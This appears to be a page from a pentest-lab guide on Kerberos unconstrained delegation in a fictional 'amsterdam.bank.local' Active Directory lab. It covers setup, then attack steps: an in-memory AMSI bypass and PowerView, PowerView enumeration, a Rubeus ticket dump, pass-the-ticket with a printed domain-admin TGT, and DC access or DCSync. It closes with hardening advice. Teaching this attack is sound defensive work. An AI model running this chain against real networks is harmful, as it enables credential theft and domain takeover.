# Unconstrained Delegation

## Configuring

### Prerequisite

This section requires the SPN set during the Constrained Delegation setup on `FILE01`.

{% content-ref url="../page-3.md" %}
[page-3.md](../page-3.md)
{% endcontent-ref %}

### Configuring

1. Login on `DC02` with the username `Administrator` and password `Welcome01!`.
2. Open the "Active Directory Users and Computers" administration tool.

![](<../../../../.gitbook/assets/image (71) (1).png>)

3\. Open the "Computers" directory and right click the `FILE01` server and select "Properties".

![](<../../../../.gitbook/assets/image (69).png>)

4\. Open the "Delegation" tab and select "Trust this computer for delegation to any service (Kerberos only)".

![](<../../../../.gitbook/assets/image (17) (1).png>)

5\. Click on "Apply" and "OK".

## Attacking

### How it works

If a system has unconstrained delegation configured it saves kerberos tickets of users in the LSASS so it can be used to authenticate to other services. An attacker could extract these saved tickets and use them against any other service.

Example: We have a webserver and webapplication that authenticates to a database too change some entries on behalf of the user. To do this kerberos unconstrained delegation is configured on the webserver.

### Tools

* [Rubeus](https://github.com/GhostPack/Rubeus)

### Executing the attack

The attack will start from the perspective of already owning the `FILE01` server from the constrained delegation abuse.

{% content-ref url="../page-3.md" %}
[page-3.md](../page-3.md)
{% endcontent-ref %}

1. Login to `WS01` as Richard with the password `Sample123`.
2. Start PowerShell and download and execute an amsi and PowerView in memory:

![](<../../../../.gitbook/assets/image (12) (1).png>)

3\. Execute the following PowerView Query to retrieve all domain computers which have unconstrained delegation and only print the samaccountnames:

```
 Get-DomainComputer -UnConstrained | select samaccountname
```

![](<../../../../.gitbook/assets/image (50).png>)

4\. There are two systems with unconstrained delegation. One which is the domain controller, which always had unconstrained delegation. The other is `FILE01`. Since we got access to this system we can check if there are any tickets onto the system with Rubeus.

![](<../../../../.gitbook/assets/image (49) (1).png>)

{% hint style="info" %}
To simulate that unconstrained delegation is configured with a purpose we need to login to the FILE01 server as the administrator user. This will make sure that there are TGT tickets on the system available.
{% endhint %}

5\. There is a TGT ticket from the domain administrator, we can dump this using the following Rubeus command.

```
./Rubeus.exe dump /luid:0x85e21db /service:krbtgt nowrap
```

![](<../../../../.gitbook/assets/image (3).png>)

6\. Then on `WS01` we can import this ticket with the following Rubeus command:

```
.\Rubeus.exe ptt /ticket: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
```

![](<../../../../.gitbook/assets/image (76) (1) (1).png>)

7\. After importing the ticket we can simply create a pssession to the DC or execute a DC sync attack.

```
Enter-PSSeession dc02.amsterdam.bank.local
```

![](<../../../../.gitbook/assets/image (48).png>)

## Defending

### Recommendations

* Tightly secure and monitor the user of AD objects with delegation set.
  * Set strong passwords and rotate them periodically.
  * Limit logons to systems.
  * Harden the systems these accounts are used.
* Add the flag "this account is sensitive and cannot be delegated"
* Add all high privileged accounts to the protected users group.

{% content-ref url="../../../../defence/hardening/protected-users-group.md" %}
[protected-users-group.md](../../../../defence/hardening/protected-users-group.md)
{% endcontent-ref %}

### Detection



## References

{% embed url="https://github.com/GhostPack/Rubeus" %}
